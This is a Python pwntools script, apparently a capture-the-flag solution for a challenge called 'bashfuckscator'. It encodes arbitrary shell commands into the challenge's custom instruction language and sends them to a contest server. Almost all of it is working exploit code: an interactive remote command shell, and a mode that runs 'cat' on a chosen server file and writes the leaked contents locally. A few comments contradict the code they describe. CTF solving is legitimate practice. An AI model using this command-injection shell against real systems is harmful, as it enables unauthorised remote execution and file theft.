#!/usr/bin/env python
"""Partial solution for bashfuckscator."""
from enum import Enum
from pwn import *


context.log_level = 'info'


INCREMENT = 0
DECREMENT = 1
OUTPUT = 2
INC_REG = 3
DEC_REG = 4
EXIT = 5
START_LOOP = 6
END_LOOP = 7


def remap_payload(payload):
    """Remaps the input stream to fit the cyclic input encoding of bashfuckscator."""
    i = 0
    for x in payload:
        i = i%10
        yield str((x+i)%10)[0]
        i += 1


def get_payload(cmd):
    """Executes one command on the server."""

    payload = []

    # Set reg_2 to 49
    payload += [INC_REG]  # Set current register to reg_1
    payload += [INCREMENT]*7  # Increment value in reg_1 by 7

    payload += [START_LOOP]  # Start loop
    payload += [INC_REG]  # Set current register to reg_2
    payload += [INCREMENT]*7  # Increment value in reg_2 by 7
    payload += [DEC_REG]  # Set current register to reg_1
    payload += [DECREMENT]  # Decrement current register (counter)
    payload += [END_LOOP]  # End loop

    # Set reg_1 to 100
    payload += [DEC_REG]  # Set current register to reg_0
    payload += [INCREMENT]*10  # Increment value in reg_0 by 7

    payload += [START_LOOP]  # Start loop
    payload += [INC_REG]  # Set current register to reg_1
    payload += [INCREMENT]*10  # Increment value in reg_1 by 7
    payload += [DEC_REG]  # Set current register to reg_0
    payload += [DECREMENT]  # Decrement current register (counter)
    payload += [END_LOOP]  # End loop

    payload += [INC_REG]

    regs = [0, 100, 49]

    curr_reg = 1
    for c in map(ord, cmd):

        if c > 80:
            # Use reg_1
            this_reg = 1
        elif c > 30:
            # Use reg_2
            this_reg = 2
        else:
            # Use reg_0
            this_reg = 0

        while curr_reg < this_reg:
            payload += [INC_REG]
            curr_reg += 1
        while curr_reg > this_reg:
            payload += [DEC_REG]
            curr_reg -= 1

        if c > regs[this_reg]:
            payload += [INCREMENT]*(c - regs[this_reg])
        if c < regs[this_reg]:
            payload += [DECREMENT]*(regs[this_reg] - c)

        regs[this_reg] = c
        payload += [OUTPUT]

    return ''.join(remap_payload(payload))


def main():
    """Loop for executing commands on the server."""
    if len(sys.argv) == 2:
        leak_file = sys.argv[1]

        r = remote('chal.cybersecurityrumble.de', 2946)
        r.recvuntil('code.\n')
        r.sendline(get_payload(f'cat {leak_file}'))
        result = r.recvall()[:-1]
        with open(leak_file, 'wb') as fptr:
            fptr.write(result)

    else:
        while True:
            cmd = raw_input('$ ').strip().decode()

            context.log_level = 'warn'
            r = remote('chal.cybersecurityrumble.de', 2946)
            r.recvuntil('code.\n')
            r.sendline(get_payload(cmd))
            result = r.recvall()[:-1]
            context.log_level = 'info'
            print(result.decode())


if __name__ == '__main__':
    main()
